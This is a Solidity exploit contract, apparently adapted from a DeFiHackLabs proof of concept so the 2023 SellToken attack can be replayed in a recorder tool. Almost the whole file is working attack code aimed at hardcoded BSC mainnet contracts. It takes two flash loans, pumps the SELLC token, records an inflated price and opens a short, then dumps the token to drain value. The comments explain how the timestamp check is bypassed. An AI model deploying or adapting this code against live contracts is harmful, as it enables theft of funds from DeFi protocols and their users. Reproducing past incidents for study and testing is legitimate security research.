// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-SellToken).
//
// The DeFiHackLabs PoC (test/SellToken_exp.sol) runs the whole attack INLINE in
// the Foundry `SellTokenExp is Test` harness: it takes TWO DODO DPPOracle flash
// loans with a `vm.warp(+100)` between them, and the flash-loan callback
// `DPPFlashLoanCall` lives on the test itself. The EVM Playground recorder uses a
// SINGLE fixed block.timestamp for the whole replay, so the in-test `vm.warp`
// (which advances time so `ShortStart`'s `block.timestamp > tokenPriceTime` gate
// opens) cannot be reproduced by replaying `testExp()` verbatim. This file is a
// faithful, self-contained copy of that inline attack, split across the
// recorder's two phases so the timestamp gate is satisfied via a build-time
// `storeSlot` instead of `vm.warp`:
//
//   setup()    — flash-loan A: pump SELLC, snapshot the inflated price via
//                setTokenPrice(), dump SELLC, repay. (run unrecorded by the
//                recorder as a setup rawCall). This locks `tokenPrice[exploit][SELLC]`
//                at the pumped value and writes `tokenPriceTime = block.timestamp + 30`.
//   storeSlot  — recorder overwrites `tokenPriceTime[exploit][SELLC]` to 0 so
//                ShortStart's `block.timestamp > tokenPriceTime` gate opens at the
//                replay's fixed timestamp (mirrors the test's `vm.warp(+100)`).
//   run()      — the RECORDED entrypoint: flash-loan B = pump again, ShortStart()
//                at the top, dump to crash the price, withdraw() to settle the
//                short against the manufactured drop, repay. Profit stays in-contract.
//
// Logic, constants, and the callback are copied verbatim from
// test/SellToken_exp.sol (only the `vm.warp` is replaced by the storeSlot, and
// the two flashLoan calls are moved into separate entrypoints).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external;
    function approve(address, uint256) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ISellToken {
    function ShortStart(address coin, address addr, uint256 terrace) external payable;
    function withdraw(address token) external;
    function setTokenPrice(address _token) external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract SellTokenDrain {
    address constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef; // unused (profit kept in-contract)
    IDPPOracle constant ORACLE = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681); // double-B "CeBb5d"
    ISellToken constant S_ROUTER = ISellToken(0x57Db19127617B77c8abd9420b5a35502b59870D6);
    IERC20 constant SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    IUniswapV2Router constant P_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    // Seed capital (mirrors test setUp's `deal(wbnb, address(this), 10 ether)`).
    // Provided by the recorder's setup.fundAttackerWei + a WBNB wrap, or simply
    // by funding this contract before setup() runs.
    uint256 constant SEED = 10 ether;

    // ---- Phase 1 (unrecorded setup): loan A — snapshot an inflated price ----
    // Mirrors the test's first flashLoan with data.length > 20. The 10 WBNB seed
    // is dealt directly to this contract by the recorder's setup (dealToken),
    // mirroring the test's `deal(wbnb, this, 10 ether)` — so setup() just runs
    // the flash loan.
    function setup() external {
        ORACLE.flashLoan(WBNB.balanceOf(address(ORACLE)), 0, address(this), bytes("a123456789012345678901234567890"));
    }

    // ---- Phase 2 (recorded): loan B — open short high, dump, close low ----
    // Mirrors the test's second flashLoan with data.length == 3 ("abc").
    function run() external {
        ORACLE.flashLoan(WBNB.balanceOf(address(ORACLE)), 0, address(this), bytes("abc"));
    }

    // DODO DPPOracle flash-loan callback (DPPFlashLoanCall). Verbatim copy of the
    // test's callback: data.length > 20 → phase A (pump + setTokenPrice + dump);
    // otherwise → phase B (pump + ShortStart + dump + withdraw + repay).
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        uint256 balance = WBNB.balanceOf(address(this));
        if (data.length > 20) {
            balance -= SEED;
        }
        uint256 swap_balance = balance * 99 / 100;
        uint256 short_balance = balance - swap_balance;
        WBNB.withdraw(short_balance);

        // 1. lift price (pump: WBNB -> SELLC)
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SELLC);
        WBNB.approve(address(P_ROUTER), type(uint256).max);
        SELLC.approve(address(P_ROUTER), type(uint256).max);
        P_ROUTER.swapExactTokensForTokens(swap_balance, 0, path, address(this), block.timestamp + 1000);

        // 2. snapshot price (phase A) OR open the short (phase B)
        if (data.length > 20) {
            S_ROUTER.setTokenPrice(address(SELLC));
        } else {
            S_ROUTER.ShortStart{value: address(this).balance}(address(SELLC), address(this), 1);
        }

        // 3. drop price (dump: SELLC -> WBNB)
        path[0] = address(SELLC);
        path[1] = address(WBNB);
        P_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );

        // 4. settle: phase B closes the short; phase A just repays.
        if (data.length < 20) {
            S_ROUTER.withdraw(address(SELLC));
            WBNB.deposit{value: address(this).balance}();
            WBNB.transfer(address(ORACLE), balance);
        } else {
            WBNB.deposit{value: address(this).balance}();
            WBNB.transfer(address(ORACLE), balance);
        }
    }

    receive() external payable {}
}
